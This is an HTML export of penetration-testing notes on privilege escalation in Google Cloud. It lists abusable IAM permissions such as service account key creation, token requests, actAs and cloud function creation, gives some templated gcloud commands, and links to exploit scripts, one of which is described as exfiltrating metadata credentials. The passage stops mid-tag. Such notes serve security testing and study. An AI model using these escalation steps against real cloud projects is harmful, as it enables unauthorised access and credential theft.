<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>GCP Penetration Testing Notes II</title><style>
/* cspell:disable-file */
/* webkit printing magic: print all background colors */
html {
	-webkit-print-color-adjust: exact;
}
* {
	box-sizing: border-box;
	-webkit-print-color-adjust: exact;
}

html,
body {
	margin: 0;
	padding: 0;
}
@media only screen {
	body {
		margin: 2em auto;
		max-width: 900px;
		color: rgb(55, 53, 47);
	}
}

body {
	line-height: 1.5;
	white-space: pre-wrap;
}

a,
a.visited {
	color: inherit;
	text-decoration: underline;
}

.pdf-relative-link-path {
	font-size: 80%;
	color: #444;
}

h1,
h2,
h3 {
	letter-spacing: -0.01em;
	line-height: 1.2;
	font-weight: 600;
	margin-bottom: 0;
}

.page-title {
	font-size: 2.5rem;
	font-weight: 700;
	margin-top: 0;
	margin-bottom: 0.75em;
}

h1 {
	font-size: 1.875rem;
	margin-top: 1.875rem;
}

h2 {
	font-size: 1.5rem;
	margin-top: 1.5rem;
}

h3 {
	font-size: 1.25rem;
	margin-top: 1.25rem;
}

.source {
	border: 1px solid #ddd;
	border-radius: 3px;
	padding: 1.5em;
	word-break: break-all;
}

.callout {
	border-radius: 3px;
	padding: 1rem;
}

figure {
	margin: 1.25em 0;
	page-break-inside: avoid;
}

figcaption {
	opacity: 0.5;
	font-size: 85%;
	margin-top: 0.5em;
}

mark {
	background-color: transparent;
}

.indented {
	padding-left: 1.5em;
}

hr {
	background: transparent;
	display: block;
	width: 100%;
	height: 1px;
	visibility: visible;
	border: none;
	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
}

img {
	max-width: 100%;
}

@media only print {
	img {
		max-height: 100vh;
		object-fit: contain;
	}
}

@page {
	margin: 1in;
}

.collection-content {
	font-size: 0.875rem;
}

.column-list {
	display: flex;
	justify-content: space-between;
}

.column {
	padding: 0 1em;
}

.column:first-child {
	padding-left: 0;
}

.column:last-child {
	padding-right: 0;
}

.table_of_contents-item {
	display: block;
	font-size: 0.875rem;
	line-height: 1.3;
	padding: 0.125rem;
}

.table_of_contents-indent-1 {
	margin-left: 1.5rem;
}

.table_of_contents-indent-2 {
	margin-left: 3rem;
}

.table_of_contents-indent-3 {
	margin-left: 4.5rem;
}

.table_of_contents-link {
	text-decoration: none;
	opacity: 0.7;
	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
}

table,
th,
td {
	border: 1px solid rgba(55, 53, 47, 0.09);
	border-collapse: collapse;
}

table {
	border-left: none;
	border-right: none;
}

th,
td {
	font-weight: normal;
	padding: 0.25em 0.5em;
	line-height: 1.5;
	min-height: 1.5em;
	text-align: left;
}

th {
	color: rgba(55, 53, 47, 0.6);
}

ol,
ul {
	margin: 0;
	margin-block-start: 0.6em;
	margin-block-end: 0.6em;
}

li > ol:first-child,
li > ul:first-child {
	margin-block-start: 0.6em;
}

ul > li {
	list-style: disc;
}

ul.to-do-list {
	padding-inline-start: 0;
}

ul.to-do-list > li {
	list-style: none;
}

.to-do-children-checked {
	text-decoration: line-through;
	opacity: 0.375;
}

ul.toggle > li {
	list-style: none;
}

ul {
	padding-inline-start: 1.7em;
}

ul > li {
	padding-left: 0.1em;
}

ol {
	padding-inline-start: 1.6em;
}

ol > li {
	padding-left: 0.2em;
}

.mono ol {
	padding-inline-start: 2em;
}

.mono ol > li {
	text-indent: -0.4em;
}

.toggle {
	padding-inline-start: 0em;
	list-style-type: none;
}

/* Indent toggle children */
.toggle > li > details {
	padding-left: 1.7em;
}

.toggle > li > details > summary {
	margin-left: -1.1em;
}

.selected-value {
	display: inline-block;
	padding: 0 0.5em;
	background: rgba(206, 205, 202, 0.5);
	border-radius: 3px;
	margin-right: 0.5em;
	margin-top: 0.3em;
	margin-bottom: 0.3em;
	white-space: nowrap;
}

.collection-title {
	display: inline-block;
	margin-right: 1em;
}

.page-description {
    margin-bottom: 2em;
}

.simple-table {
	margin-top: 1em;
	font-size: 0.875rem;
	empty-cells: show;
}
.simple-table td {
	height: 29px;
	min-width: 120px;
}

.simple-table th {
	height: 29px;
	min-width: 120px;
}

.simple-table-header-color {
	background: rgb(247, 246, 243);
	color: black;
}
.simple-table-header {
	font-weight: 500;
}

time {
	opacity: 0.5;
}

.icon {
	display: inline-block;
	max-width: 1.2em;
	max-height: 1.2em;
	text-decoration: none;
	vertical-align: text-bottom;
	margin-right: 0.5em;
}

img.icon {
	border-radius: 3px;
}

.user-icon {
	width: 1.5em;
	height: 1.5em;
	border-radius: 100%;
	margin-right: 0.5rem;
}

.user-icon-inner {
	font-size: 0.8em;
}

.text-icon {
	border: 1px solid #000;
	text-align: center;
}

.page-cover-image {
	display: block;
	object-fit: cover;
	width: 100%;
	max-height: 30vh;
}

.page-header-icon {
	font-size: 3rem;
	margin-bottom: 1rem;
}

.page-header-icon-with-cover {
	margin-top: -0.72em;
	margin-left: 0.07em;
}

.page-header-icon img {
	border-radius: 3px;
}

.link-to-page {
	margin: 1em 0;
	padding: 0;
	border: none;
	font-weight: 500;
}

p > .user {
	opacity: 0.5;
}

td > .user,
td > time {
	white-space: nowrap;
}

input[type="checkbox"] {
	transform: scale(1.5);
	margin-right: 0.6em;
	vertical-align: middle;
}

p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}

.image {
	border: none;
	margin: 1.5em 0;
	padding: 0;
	border-radius: 0;
	text-align: center;
}

.code,
code {
	background: rgba(135, 131, 120, 0.15);
	border-radius: 3px;
	padding: 0.2em 0.4em;
	border-radius: 3px;
	font-size: 85%;
	tab-size: 2;
}

code {
	color: #eb5757;
}

.code {
	padding: 1.5em 1em;
}

.code-wrap {
	white-space: pre-wrap;
	word-break: break-all;
}

.code > code {
	background: none;
	padding: 0;
	font-size: 100%;
	color: inherit;
}

blockquote {
	font-size: 1.25em;
	margin: 1em 0;
	padding-left: 1em;
	border-left: 3px solid rgb(55, 53, 47);
}

.bookmark {
	text-decoration: none;
	max-height: 8em;
	padding: 0;
	display: flex;
	width: 100%;
	align-items: stretch;
}

.bookmark-title {
	font-size: 0.85em;
	overflow: hidden;
	text-overflow: ellipsis;
	height: 1.75em;
	white-space: nowrap;
}

.bookmark-text {
	display: flex;
	flex-direction: column;
}

.bookmark-info {
	flex: 4 1 180px;
	padding: 12px 14px 14px;
	display: flex;
	flex-direction: column;
	justify-content: space-between;
}

.bookmark-image {
	width: 33%;
	flex: 1 1 180px;
	display: block;
	position: relative;
	object-fit: cover;
	border-radius: 1px;
}

.bookmark-description {
	color: rgba(55, 53, 47, 0.6);
	font-size: 0.75em;
	overflow: hidden;
	max-height: 4.5em;
	word-break: break-word;
}

.bookmark-href {
	font-size: 0.75em;
	margin-top: 0.25em;
}

.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.highlight-default {
	color: rgba(55, 53, 47, 1);
}
.highlight-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.highlight-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.highlight-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.highlight-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.highlight-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.highlight-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.highlight-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.highlight-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.highlight-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.highlight-gray_background {
	background: rgba(241, 241, 239, 1);
}
.highlight-brown_background {
	background: rgba(244, 238, 238, 1);
}
.highlight-orange_background {
	background: rgba(251, 236, 221, 1);
}
.highlight-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.highlight-teal_background {
	background: rgba(237, 243, 236, 1);
}
.highlight-blue_background {
	background: rgba(231, 243, 248, 1);
}
.highlight-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.highlight-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.highlight-red_background {
	background: rgba(253, 235, 236, 1);
}
.block-color-default {
	color: inherit;
	fill: inherit;
}
.block-color-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.block-color-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.block-color-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.block-color-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.block-color-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.block-color-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.block-color-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.block-color-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.block-color-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.block-color-gray_background {
	background: rgba(241, 241, 239, 1);
}
.block-color-brown_background {
	background: rgba(244, 238, 238, 1);
}
.block-color-orange_background {
	background: rgba(251, 236, 221, 1);
}
.block-color-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.block-color-teal_background {
	background: rgba(237, 243, 236, 1);
}
.block-color-blue_background {
	background: rgba(231, 243, 248, 1);
}
.block-color-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.block-color-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.block-color-red_background {
	background: rgba(253, 235, 236, 1);
}
.select-value-color-uiBlue { background-color: rgba(35, 131, 226, .07); }
.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
.select-value-color-transparentGray { background-color: rgba(227, 226, 224, 0); }
.select-value-color-translucentGray { background-color: rgba(0, 0, 0, 0.06); }
.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
.select-value-color-pageGlass { background-color: undefined; }
.select-value-color-washGlass { background-color: undefined; }

.checkbox {
	display: inline-flex;
	vertical-align: text-bottom;
	width: 16;
	height: 16;
	background-size: 16px;
	margin-left: 2px;
	margin-right: 5px;
}

.checkbox-on {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
}

.checkbox-off {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
}
	
</style></head><body><article id="e34bd4fc-e93b-44c7-9ec6-56746b2a9b80" class="page mono"><header><h1 class="page-title"><strong>GCP Penetration Testing Notes II</strong></h1><p class="page-description"></p></header><div class="page-body"><h1 id="21bcb6d6-b248-47bf-9d6a-cb59c6c328a2" class=""><strong>Privilege Escalation</strong></h1><hr id="c5277d3b-b63f-49b8-962b-218bdfd43b4a"/><h1 id="a5340bad-e124-4998-863b-da5d58211eec" class=""><strong>Deployment Manager</strong></h1><p id="f7772ec0-b7b8-45d1-afba-4530f23dd3ac" class="">Privesc using the <code>deploymentmanager.deployments.create</code> permission</p><h1 id="28c12bbb-b201-4208-8b5c-a97d9181a656" class=""><strong>Actions Allowed</strong></h1><ul id="81719481-8328-4971-abf0-556c5cb2d8c2" class="bulleted-list"><li style="list-style-type:disc">launch new deployments as the <code>&lt;PROJECT_NUMBER&gt;@cloudservices.gserviceaccount.com</code> service account without needing <code>iam.serviceAccounts.actAs</code> permission</li></ul><ul id="d236a0ae-321c-4159-aa41-ef403e653710" class="bulleted-list"><li style="list-style-type:disc">deployments provided <code>Editor</code> role within project</li></ul><ul id="b367d360-ff9a-4e13-b8f8-91dec3ec2efd" class="bulleted-list"><li style="list-style-type:disc"><code>compute.instances.create</code> not needed because the <code>cloudservices</code> service account has that permission, so you can create a Compute VM</li></ul><ul id="764bf24f-716e-4abb-bfed-4507c4e62036" class="bulleted-list"><li style="list-style-type:disc">can use a <code>YAML</code> configuration file template to create all kinds of resources<ul id="80b9ff12-8380-4997-8566-240f06007cdd" class="bulleted-list"><li style="list-style-type:circle">run <code>gcloud deployment-manager types list</code> to see supported resources</li></ul></li></ul><h1 id="cbec3d4a-91e0-477d-b826-43b72408bc12" class=""><strong>IAM</strong></h1><p id="56b9afbd-4eeb-4705-b7fd-169f7472a4ba" class=""><a href="https://rhinosecuritylabs.com/cloud-security/privilege-escalation-google-cloud-platform-part-1">https://rhinosecuritylabs.com/cloud-security/privilege-escalation-google-cloud-platform-part-1</a></p><h1 id="0077d23b-0786-4d5d-b083-55c76f9890ee" class=""><strong>Roles Update</strong></h1><p id="4139ca10-3b28-4a94-89ea-a5827643cd1a" class=""><code>iam.roles.update</code></p><ul id="d72d57fd-caf6-4a98-9f21-5af95ac00ce4" class="bulleted-list"><li style="list-style-type:disc">add permissions to a role you are assigned to</li></ul><figure id="b6471e5d-de82-4888-9987-1bd9ad3499c4" class="image"><a href="https://0xd4y.com/images/GCP%20Penetration%20Testing%20Notes%202%20e0f928c1a83c48cf919cc74733148fcb/Untitled.png"><img style="width:700px" src="https://0xd4y.com/images/GCP%20Penetration%20Testing%20Notes%202%20e0f928c1a83c48cf919cc74733148fcb/Untitled.png"/></a></figure><p id="b7d8742e-00bb-4035-bc1b-e4fa46403b17" class=""><code>gcloud iam roles &lt;ROLE_NAME&gt; --project &lt;PROJECT_NAME&gt; --add-permissions &lt;PERMISSION&gt;</code></p><p id="6576c39e-e2dc-49d9-a969-b6c8adaf009b" class=""><a href="https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.roles.update.py">Exploit script</a></p><h1 id="f9666886-c251-46d8-8b74-de54fa80c432" class=""><strong>Get Access Token</strong></h1><p id="4dffcdb3-35e6-4dde-8953-100250a527e0" class=""><code>iam.serviceAccounts.getAccessToken</code></p><ul id="83b0e141-f95c-4b1d-aa64-2af7aade3e0b" class="bulleted-list"><li style="list-style-type:disc">permission to request access token for a service account</li></ul><ul id="51567148-f8dd-4452-8197-da174e71640b" class="bulleted-list"><li style="list-style-type:disc">request access token for a higher-privileged service account</li></ul><p id="1d45f10f-c22f-4d7a-a1c9-17c5010d3eec" class=""><a href="https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.serviceAccounts.getAccessToken.py">Exploit script</a></p><h1 id="7da99711-1137-4be6-8c09-93930ea01bd8" class=""><strong>Create Keys</strong></h1><p id="81759aa9-57de-4fa9-a108-3e8152553e1e" class=""><code>iam.serviceAccountKeys.create</code></p><ul id="b253c119-0353-4088-b9c5-25f74959d996" class="bulleted-list"><li style="list-style-type:disc">permission to create a key for a service account</li></ul><ul id="2d575e40-ccc2-4914-8d27-61ae3c4d1c78" class="bulleted-list"><li style="list-style-type:disc">create a key as the service account and then authenticate as them</li></ul><p id="dad8996e-5a20-469a-ae53-447cc800bd08" class=""><code>gcloud iam service-accounts keys create --iam-account &lt;SERVICE_ACCOUNT_NAME&gt;@&lt;PROJECT&gt;.iam.gserviceaccount..com</code></p><p id="3b9a8d60-7d6c-4e68-beed-5a9bde228915" class=""><a href="https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.serviceAccountKeys.create.py">Exploit script</a></p><h1 id="cbb008d3-22d3-44d4-a1ae-5c082cd5928b" class=""><strong>Implicit Delegation</strong></h1><p id="581c502d-5837-4a41-9fdf-2b99f72ec8aa" class=""><code>iam.serviceAccounts.implicitDelegation</code></p><p id="64e02e2e-d682-45fa-9f6f-2d136e386231" class="">If you have this permission on another service account with <code>iam.serviceAccounts.getAccessToken</code> , you can get the access token for another service account through implicit delegation:</p><figure id="ece7ee8b-5255-43c1-8c75-f681e73d54a0" class="image"><a href="https://0xd4y.com/images/GCP%20Penetration%20Testing%20Notes%202%20e0f928c1a83c48cf919cc74733148fcb/Untitled%201.png"><img style="width:500px" src="https://0xd4y.com/images/GCP%20Penetration%20Testing%20Notes%202%20e0f928c1a83c48cf919cc74733148fcb/Untitled%201.png"/></a></figure><p id="e4e9c592-2f85-40f9-8af4-a2df3206d83b" class=""><a href="https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.serviceAccounts.implicitDelegation.py">Exploit script</a></p><h1 id="11d9149f-d08e-4769-a342-b59937319f2b" class=""><strong>Sign Blob</strong></h1><p id="63bb85ae-12ac-40a1-a039-e26bb01a8ff0" class=""><code>iam.serviceAccounts.signBlob</code></p><ul id="b28f4e49-1af4-43f9-8659-d8a25b701793" class="bulleted-list"><li style="list-style-type:disc">create a signed blob that retrieves the access token for the targeted service account1</li></ul><ul id="43181030-b933-4b8c-9aea-b2597ef44174" class="bulleted-list"><li style="list-style-type:disc">sign arbitrary payload</li></ul><p id="b446062e-a746-43a0-baaf-8468f0b116a5" class=""><a href="https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.serviceAccounts.signBlob-accessToken.py">Exploit Script 1</a></p><p id="3d56788f-b7c4-4a02-931c-3d39e178e21e" class=""><a href="https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.serviceAccounts.signBlob-gcsSignedUrl.py">Exploit Script 2</a></p><h1 id="84db430f-b390-41cb-ab70-1e1e4a90ac0d" class=""><strong>Sign JWT</strong></h1><p id="252c93f6-7be4-4bdf-a4dc-457b0d1ecfc6" class=""><code>iam.serviceAccounts.signJwt</code></p><ul id="6fa5edea-e7f6-4f2b-8fac-8db654ed3058" class="bulleted-list"><li style="list-style-type:disc">sign a JWT and request an access token for the targeted service account</li></ul><p id="4f02f7fb-854c-4f83-b7ad-3703ea601380" class=""><a href="https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.serviceAccounts.signJWT.py">Exploit Script</a></p><h1 id="c538b15b-1b6d-46c0-a498-b9b7d2caf4d8" class=""><strong>Act As</strong></h1><p id="a6eab949-0023-43d3-8186-5f481f6b6530" class=""><code>iam.serviceAccounts.actAs</code></p><ul id="860deb89-62e7-4a8c-a1f4-11c9ef569e6a" class="bulleted-list"><li style="list-style-type:disc">GCP version of AWS <code>iam:PassRole</code></li></ul><ul id="1eee9297-456a-4576-a565-fd6cd008a62a" class="bulleted-list"><li style="list-style-type:disc">create a new resource as the targeted service account<ul id="f00feb11-3f1c-40f5-96ad-80b5a979cf55" class="bulleted-list"><li style="list-style-type:circle">the new resource can be a function, Compute Engine instance, etc.</li></ul></li></ul><p id="02c57e8f-0d49-433c-9c04-c234be114f68" class=""><strong>Cloud Function Creation</strong></p><ul id="68721e89-9548-47a3-a399-fcf640ab2b47" class="bulleted-list"><li style="list-style-type:disc">create a cloud function with a higher-privileged service account and then invoke it</li></ul><p id="364882b1-7296-4a84-9837-f9daf669bc63" class="">The following permissions are necessary:</p><ol type="1" id="a963aa8e-2b56-4c10-acd3-46e14cfac596" class="numbered-list" start="1"><li><code><a href="https://cloudfunctions.functions.call/">c</a></code><code>loudfunctions.functions.call</code> or <code>cloudfunctions.functions.setIamPolicy</code><ol type="a" id="bd74a9e8-dda9-440a-b4e4-18d7bc5ddf8a" class="numbered-list" start="1"><li>Either immediately invoke a function or set the IAM policy of the function to allow you to invoke it.</li></ol></li></ol><ol type="1" id="07f58636-f50b-461d-b4dd-0d10f655f36a" class="numbered-list" start="2"><li><code>cloudfunctions.functions.create</code>: create new functions</li></ol><ol type="1" id="af84bb83-7009-4a4d-a075-f7abdbf0d4c1" class="numbered-list" start="3"><li><code>cloudfunctions.functions.sourceCodeSet</code>: update function source code</li></ol><ol type="1" id="a387e9e2-5a86-4eb5-8af1-119a57b99efe" class="numbered-list" start="4"><li><code>iam.serviceAccounts.actAs</code></li></ol><p id="0ee7856a-e5ae-40ad-ba64-dd0559fb1fd8" class=""><a href="https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.create-call.py">Exploit Script 1</a></p><p id="c83b874e-7229-4dea-8b27-387edea41c25" class=""><a href="https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.create-setIamPolicy.py">Exploit Script 2</a></p><p id="05de849e-6b68-4472-ac60-0607a8409427" class=""><a href="https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/tree/master/ExploitScripts/CloudFunctions">Function zip file</a></p><ul id="8b0d1eeb-bb5d-4912-96fc-99baac95db35" class="bulleted-list"><li style="list-style-type:disc">zip file is a function that retrieves access token from metadata</li></ul><p id="47d124e2-c1b0-487d-b440-21ac3724a09d" class=""><strong>Cloud Function Update</strong></p><ul id="4b63bb7c-4362-45b9-887e-603760c5ae6d" class="bulleted-list"><li style="list-style-type:disc">update an existing function</li></ul><p id="57d69df8-7197-470d-90a3-098000e42bfb" class="">The following permissions are necessary:</p><ol type="1" id="7b7ef51f-7f7a-4a7c-8bd2-131bd0146185" class="numbered-list" start="1"><li><code>cloudfunctions.functions.sourceCodeSet</code></li></ol><ol type="1" id="904c6333-1013-41e7-91d4-6a3a5304b3e2" class="numbered-list" start="2"><li><code>cloudfunctions.functions.update</code></li></ol><ol type="1" id="36100950-9116-4f39-81ca-cc660a17a3c5" class="numbered-list" start="3"><li><code>iam.serviceAccounts.actAs</code></li></ol><p id="9b4a455e-b53c-4e67-8b8a-b6a56a233add" class=""><a href="https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.update.py">Exploit Script</a></p><p id="a017c84a-039f-461c-8e0d-234fac61aa6f" class=""><strong>Compute Instance Create</strong></p><ul id="7fd138fa-6760-4dfa-9941-92eda5f29e8a" class="bulleted-list"><li style="list-style-type:disc">create a Compute Engine using a high-privileged service account</li></ul><p id="955c25b4-dadb-4541-9f34-0f012f65c807" class="">Necessary permissions:</p><ol type="1" id="e0adf375-1d7d-4c56-8eca-b88c5817488d" class="numbered-list" start="1"><li><code>compute.disks.create</code></li></ol><ol type="1" id="f8d032f3-dabd-4e10-b15a-6befaf7768da" class="numbered-list" start="2"><li><code>compute.instances.create</code></li></ol><ol type="1" id="4668c3a8-e857-44e7-a64f-acd13d786c05" class="numbered-list" start="3"><li><code>compute.instances.setMetadata</code></li></ol><ol type="1" id="3f74fd9e-04a2-4aef-b828-cd4162d9bccc" class="numbered-list" start="4"><li><code>compute.instances.setServiceAccount</code></li></ol><ol type="1" id="76350e19-62a6-4874-8690-eb985b62bf35" class="numbered-list" start="5"><li><code>compute.subnetworks.use</code></li></ol><ol type="1" id="33e0e944-8277-4392-8777-333eaa188f11" class="numbered-list" start="6"><li><code>compute.subnetworks.useExternalIp</code></li></ol><ol type="1" id="06980afc-b15a-410e-8c10-f7e709c08f9b" class="numbered-list" start="7"><li><code>iam.serviceAccounts.actAs</code></li></ol><p id="4e4c28e3-e393-4364-bd8e-55e16ff91c45" class=""><a href="https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/compute.instances.create.py">Exploit Script</a></p><ul id="f9b8aea7-3533-4e07-9f69-82abae6e6f88" class="bulleted-list"><li style="list-style-type:disc">create instance then exfiltrates creds from metadata to a specified URL and port</li></ul><p id="d8ad25f6-8d0f-41d7-8ef4-87057d9bec6e" class=""><strong>Create Cloud Run Service</strong></p><ul id="eaa975c0-cf8c-423e-a7e6-c6494b00919a" class="bulleted-list"><li style="list-style-type:disc">service for building and deploying containerized apps</li></ul><ul id="5a93e439-1b71-4a44-94bc-25421e147c8f" class="bulleted-list"><li style="list-style-type:disc">create new cloud run service, invoke it, and get the access token from metadata service</li></ul><p id="481d6777-4d1f-435a-9755-5af51a10c8d5" class="">Necessary permissions:</p><ol type="1" id="146b6ade-6c48-496a-b641-16703c9e1642" class="numbered-list" start="1"><li><code>run.services.create</code></li></ol><ol type="1" id="10b13b18-3410-46b9-b89b-992ac8424b32" class="numbered-list" start="2"><li><code>run.services.setIamPolicy</code> or <code>run.routes.invoke</code></li></ol><ol type="1" id="7c427e12-0329-4609-8282-b8ee516cec27" class="numbered-list" start="3"><li><code>iam.serviceaccounts.actAs</code></li></ol><p id="62e53976-23f4-4c22-82ac-52b2f8f74e94" class=""><a 